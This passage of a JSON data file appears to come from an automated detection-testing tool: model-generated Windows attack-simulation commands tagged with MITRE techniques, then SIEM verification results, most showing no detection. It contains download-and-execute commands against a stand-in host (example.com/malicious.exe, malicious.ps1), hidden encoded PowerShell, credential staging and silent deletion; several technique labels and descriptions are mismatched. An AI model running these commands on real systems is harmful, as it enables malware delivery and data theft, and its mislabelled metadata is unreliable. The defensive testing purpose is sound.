      "command": "powershell -Command \"try { $code = 'Write-Host \\\"Simulated payload in remote process\\\"'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($code); $b64 = [Convert]::ToBase64String($bytes); Start-Process -FilePath 'notepad.exe' -Wait; $proc = Get-Process -Name 'notepad' -ErrorAction SilentlyContinue; if ($proc) { powershell -EncodedCommand $b64 -WindowStyle Hidden } } catch { }\"",
      "description": "Advanced simulated injection where a Base64-encoded UTF-16LE PowerShell command is executed in the context of a spawned notepad process (simulating reflective injection)",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Spawns notepad.exe, then runs a hidden encoded PowerShell instance that mimics execution in the context of the process. No actual memory injection occurs, but command structure emulates post-injection execution",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:52.280437",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a5b4eef2-27f0-4c69-a8bb-853732c4d2bd",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -encode %USERPROFILE%\\Documents\\test.txt %TEMP%\\staged_data.b64 && copy /Y %TEMP%\\staged_data.b64 %TEMP%\\collection.zip",
      "description": "Encodes a benign test file using certutil and copies it to TEMP under ZIP extension for staging",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates Base64-encoded copy of test.txt in TEMP directory. File extension mismatch (ZIP) helps avoid pattern detection. Uses native certutil for encoding.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:38.874626",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c4e8e88d-4683-42c5-84ed-aa697d58afed",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand JABjACAAPQAgACcAJwA7ACAAJABjACsAPQAiAHUAcwBlAHIAIABwAGEAcwBzAHcAbwByAGQAOgAgACIAOwAgAEcAZQB0AC0AQwBvAG0AbQBhAG4AZAAgAHMAZQBjAGUAZABpAHQAIAAvAGkAbgBjAGwAdQBkAGUAOgBwAGEAcwBzAHcAbwByAGQAIAB8ACAAUwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJABlAG4AdgA6AFQARQBNAFAAXABjAHIAZQBkAHMALgB0AHgAdAAgAC0ARgBvAHIAYwBlAA==",
      "description": "Advanced credential staging via encoded PowerShell. Collects credential-related registry entries and writes to TEMP",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Decodes to: $c = ''; $c+='user password: '; Get-Command secedit /include:password | Set-Content $env:TEMP\\creds.txt -Force. Requires admin for registry access. Uses UTF-16LE encoded command for evasion.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:38.875140",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4e5c9e5e-97ce-42c9-aad9-6afe2633c096",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SGVsbG8gd29ybGQ='))\"",
      "description": "Detects potential Obfuscated Files or Information (T1027) using Base64 encoded string",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints 'Hello world' to the console",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.327494",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0526389e-ffa8-4618-b39d-39f2985ea543",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -decode %TEMP%\\test.txt %TEMP%\\test.txt",
      "description": "Detects potential Obfuscated Files or Information (T1027) using certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes a file using certutil",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.327494",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c6944111-2708-491d-b7db-b9ef0efa6c70",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path %TEMP%\\test.txt -Value 'Hello world'; Get-Content -Path %TEMP%\\test.txt | Set-Content -Path %TEMP%\\test.txt -Encoding UTF8\" -ErrorAction SilentlyContinue",
      "description": "Detects potential Obfuscated Files or Information (T1027) using file operations",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a file, writes to it, reads from it, and overwrites it with the same content",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.327494",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6804f9d8-162c-4129-9972-b6585794aa35",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "File Deletion",
      "tactic": "execution",
      "platform": "windows",
      "command": "del /f /q C:\\\\\\test.txt",
      "description": "Deletes a file using the del command with force and quiet options",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The file test.txt will be deleted silently",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:17.161354",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "86215308-54ab-4b81-9e1f-0675cb2df384",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "File Deletion",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Remove-Item -Path 'C:\\\\test.txt' -Force -ErrorAction SilentlyContinue\"",
      "description": "Deletes a file using PowerShell with force and silent error handling",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The file test.txt will be deleted, and any errors will be suppressed",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:17.161354",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4be8a26c-4474-46b0-9853-250ed7c8a681",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "File Deletion",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"'C:\\\\Windows\\\\System32\\\\cmd.exe' /c del /f /q C:\\\\test.txt\"",
      "description": "Deletes a file using cmd.exe invoked from PowerShell with force and quiet options",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The file test.txt will be deleted silently",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:17.161354",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8944ed6e-ff0c-46bc-b2b7-ffcade595cf3",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://example.com/payload.txt %TEMP%\\\\payload.txt",
      "description": "Download a file using certutil, a built-in Windows binary commonly abused for exfiltration or payload retrieval.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download payload.txt from the specified URL to the TEMP directory. Will display certificate trust errors if the site is unreachable or invalid.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:21.048964",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "196f4688-a6e5-4296-ae61-3fa6889e1078",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://example.com/config.xml' -OutFile '%TEMP%\\\\config.xml' -ErrorAction SilentlyContinue\"",
      "description": "Use PowerShell to silently download a configuration file over HTTP without throwing errors if the request fails.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads config.xml to the TEMP folder. Fails silently if network is unreachable or URI is invalid. No output on success due to ErrorAction preference.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:21.048964",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "deb66615-598e-4565-ac66-6236cda45d69",
      "ttp_id": "unknown",
      "technique_id": "T1155",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Expand-Archive -Path '%TEMP%\\\\data.zip' -DestinationPath '%TEMP%\\\\extracted' -Force -ErrorAction SilentlyContinue\"",
      "description": "Extract a ZIP archive using PowerShell's built-in compression support, forcing overwrite of existing files.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Silently extracts data.zip to the extracted subdirectory in TEMP. If the destination doesn't exist, it is created. If extraction fails (e.g., corrupt archive), no error is displayed.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:21.048964",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f76600c8-588d-4e76-bc2c-ef63f72e77d1",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Convert]::ToBase64String([System.Text.Encoding]::UTF16LE.GetBytes('Write-Host \\'Test Exfiltration Over C2 Channel\\''))\"",
      "description": "Exfiltration Over C2 Channel using PowerShell EncodedCommand",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will print 'Test Exfiltration Over C2 Channel' to the console, simulating exfiltration activity.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.338596",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2e713571-a792-4d40-9d67-afd443019af8",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/exfil.txt %TEMP%\\exfil.txt && type %TEMP%\\exfil.txt",
      "description": "Exfiltration Over C2 Channel using certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command will download a file from a URL and print its contents to the console, simulating exfiltration activity.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.338596",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b5794567-ccec-46b1-a13b-41bcc95fedfa",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path %TEMP%\\test.txt -DestinationPath %TEMP%\\exfil.zip -Force; Compress-Archive -Path %TEMP%\\exfil.zip -DestinationPath %TEMP%\\exfil2.zip -Force\"",
      "description": "Exfiltration Over C2 Channel using PowerShell Compress-Archive",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will create a zip archive of a file and then create another zip archive of the first zip archive, simulating exfiltration activity.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.338596",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "654976c9-77a4-493d-ac49-728b1a26c93a",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/malicious.exe %TEMP%\\malicious.exe",
      "description": "Exploit public-facing application via certutil",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Download and cache a potentially malicious executable",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.371742",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7e311dab-824b-4b5d-a2ad-c9c4515868d1",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri http://example.com/malicious.ps1 -OutFile %TEMP%\\malicious.ps1; Invoke-Command -ScriptBlock { & %TEMP%\\malicious.ps1 }\"",
      "description": "Exploit public-facing application via PowerShell",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Download and execute a potentially malicious PowerShell script",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.371742",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9a1ed535-43b5-4cdf-85df-077c16882709",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Net.WebRequest]::DefaultWebProxy = $null; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://example.com/malicious.exe', '%TEMP%\\malicious.exe')\"",
      "description": "Exploit public-facing application via WebClient",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Download a potentially malicious executable using WebClient",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.371742",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bf09f9c3-95b9-4515-b42c-8bb6b2e3b8c7",
      "ttp_id": "unknown",
      "technique_id": "T1003",
      "technique_name": "OS Credential Dumping",
      "tactic": "execution",
      "platform": "windows",
      "command": "net user /domain",
      "description": "Dump OS credentials via net user command",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Lists all user accounts in the domain",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.122469",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "37fadccf-b45d-4b10-849a-790c5ffb61da",
      "ttp_id": "unknown",
      "technique_id": "T1003",
      "technique_name": "OS Credential Dumping",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"&{Get-LocalUser | Select-Object Name,PasswordLastSet}\"",
      "description": "Dump OS credentials via PowerShell Get-LocalUser cmdlet",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Lists all local user accounts with their password last set information",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.122469",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "08a88307-f72e-47d2-b640-7f106449febe",
      "ttp_id": "unknown",
      "technique_id": "T1003",
      "technique_name": "OS Credential Dumping",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmdkey /list",
      "description": "Dump OS credentials via cmdkey command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists all stored credentials for the current user",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.122469",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d8fc0526-d545-4492-b6a4-484d1fb6e828",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path '%TEMP%\\test.txt' -DestinationPath '%TEMP%\\test.zip' -Force\"",
      "description": "Archive a test file using Compress-Archive",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a zip archive of a test file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.529448",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "99d7fcf4-ac1f-4fe4-8f6a-404405f3e5de",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::CreateFromDirectory('%TEMP%\\test', '%TEMP%\\test.zip')\"",
      "description": "Archive a test directory using ZipFile class",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a zip archive of a test directory in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.529448",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "342cced4-ed28-4cbf-91a5-993a7191cd86",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -encode '%TEMP%\\test.txt' '%TEMP%\\test.encode'",
      "description": "Encode a test file using certutil",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates an encoded file of a test file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.529448",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8fd5b64f-1a6f-45c3-ba4c-87740e01dd55",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Input Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('Hello World')\"",
      "description": "Simulate keyboard input using SendKeys",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Types 'Hello World' into the current window",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.034630",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "353b76b6-0fb0-41eb-bea2-6f09658af5ed",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Input Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Diagnostics.Process]::Start('C:\\Windows\\System32\\osk.exe')\"",
      "description": "Launches the on-screen keyboard",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Opens the on-screen keyboard",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.034630",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f2b8113c-493d-4241-b211-cdb2f22e8847",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Input Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('Hello World')\"",
      "description": "Simulate keyboard input using WScript.Shell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Types 'Hello World' into the current window",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.034630",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a448183f-8879-4a14-bee1-8d5aab4da85b",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Screen Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Drawing; $screen = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graph = [System.Drawing.Graphics]::FromImage($screen); $graph.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.X, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Y, 0, 0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size); $screen.Save('%TEMP%\\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png)\"",
      "description": "Capture the primary screen and save it to a file using PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A screenshot of the primary screen will be saved to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:19.959102",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "49966d95-4cb0-4760-9516-6fa95ca27cd9",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Screen Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); $screen = [Windows.Forms.Screen]::PrimaryScreen; $bounds = $screen.Bounds; $screenshot = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graph = [Drawing.Graphics]::FromImage($screenshot); $graph.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $screenshot.Save('%TEMP%\\screenshot2.png', [Drawing.Imaging.ImageFormat]::Png)\"",
      "description": "Capture the primary screen and save it to a file using PowerShell with Reflection",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A screenshot of the primary screen will be saved to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:19.959456",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "38594f36-f8d6-4d95-9550-429b8fca7a72",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Screen Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "nircmd.exe savescreenshot %TEMP%\\screenshot3.png",
      "description": "Capture the primary screen and save it to a file using nircmd",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A screenshot of the primary screen will be saved to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:19.959456",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "49102519-4fc2-4881-a43b-62c18e763e95",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "User Execution: Malicious File",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -urlcache http://example.com/malicious.exe %TEMP%\\malicious.exe && %TEMP%\\malicious.exe",
      "description": "Download and execute a malicious file using certutil",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The malicious file will be downloaded and executed",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:20.217653",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "47d97a68-60dd-4d4c-af90-80d94cb8d400",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "User Execution: Malicious File",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri http://example.com/malicious.ps1 -OutFile %TEMP%\\malicious.ps1; Invoke-Command -ScriptBlock {& %TEMP%\\malicious.ps1}\"",
      "description": "Download and execute a malicious PowerShell script",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The malicious script will be downloaded and executed",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:20.217653",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1d81343b-fcbe-44c0-a87d-c40f99bda717",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "User Execution: Malicious File",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$bytes = [System.IO.File]::ReadAllBytes('%TEMP%\\malicious.exe'); $assembly = [System.Reflection.Assembly]::Load($bytes); $entryPoint = $assembly.EntryPoint; $entryPoint.Invoke($null, $null)\"",
      "description": "Load and execute a malicious executable from a byte array",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The malicious executable will be loaded and executed",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:20.217653",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "e91568c2-0c4e-4546-a2f1-2ba5a6e30fad",
      "attack_id": "3facb856-01b6-40f7-b13f-2d1074674f65",
      "detected": true,
      "events_found": 2,
      "historical_events": 0,
      "query_time_ms": 593.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "eea49885-0a6d-446e-82dd-13af19fcb895",
      "attack_id": "4cf96d4f-5d32-46cd-94bf-929aee12f4f4",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 533.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "e67002f7-30ff-45ef-95ef-913cce5c63c2",
      "attack_id": "bbd42fd7-2f99-46d7-a302-0a971970b336",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 433.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "4aa8efd7-96cd-4b46-b867-fcf641f0bb26",
      "attack_id": "4944b8d3-9d23-427f-b29d-a4d2f31caae8",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 477.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "1a06f7e6-e8d8-4161-bbc0-3c5fd129a0bf",
      "attack_id": "b4ba676a-f234-47d0-8d8d-bdf3c31b5115",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 437.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "65864945-717b-49ee-ba19-2fbd8da9ddbb",
      "attack_id": "a9572550-bbe3-450d-b768-b3088d01fd18",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 429.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "54aac7b5-3f9b-49d7-90fe-80055b6b30e8",
      "attack_id": "85497952-83cb-4370-8020-b53c0d73ae46",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 589.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "51e3dcd9-192f-4377-9795-909c8734e588",
      "attack_id": "1dec9039-b2d5-40c5-a2e2-0a4b9cda1ec7",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 528.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "1df1f4de-e732-4380-9162-2a1ff056255f",
      "attack_id": "8896d155-d466-45d0-8f19-99bf57b9e95a",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 429.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "3110c81d-4dad-4cd0-809d-35b41f73fda0",
      "attack_id": "56d5d938-b198-44e7-874f-67f13ce36208",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 477.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "5dab9bed-303f-4529-9fe8-c090f0b40c0d",
      "attack_id": "157e0985-62ce-4c84-8419-fa7884a8e2d2",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 513.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "e9ce6e70-80ab-4a10-94d6-a4b146e9f131",
      "attack_id": "a9c3e34d-96e6-4d30-984b-8ac9fec6534c",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 618.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "43bbdaeb-acd0-4074-adfe-451f8b470c75",
      "attack_id": "4700ae56-c391-4c22-86e3-9c0fd17bb810",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 437.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "74b60ede-1fee-479a-bc3b-ede491303349",
      "attack_id": "60bb044a-260c-48ac-ad27-903ff668f19b",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 492.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "2051877a-33f6-4cdb-b5e7-c79a9771acb4",
      "attack_id": "83209203-3910-4ea3-a821-a02f64246159",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 500.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "62102b49-9f4a-4b1f-b574-110e7beedea4",
      "attack_id": "2249cd2a-6fb3-4e07-bd3b-4dcf558da40d",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 495.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "a6b47424-a97b-45b7-bf60-4ffcf83ab422",
      "attack_id": "db50de63-e6c1-42bd-af53-436999089025",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Invalid SPL: Unbalanced quotes."
    },
    {
      "rule_id": "c1720ac2-5ed9-453c-be11-01da69241eb1",
      "attack_id": "bccc88f1-3572-4d74-adde-374787f3c53c",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 496.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "ec4e501b-3a4f-4c3e-b635-4a4ba1dfeed6",
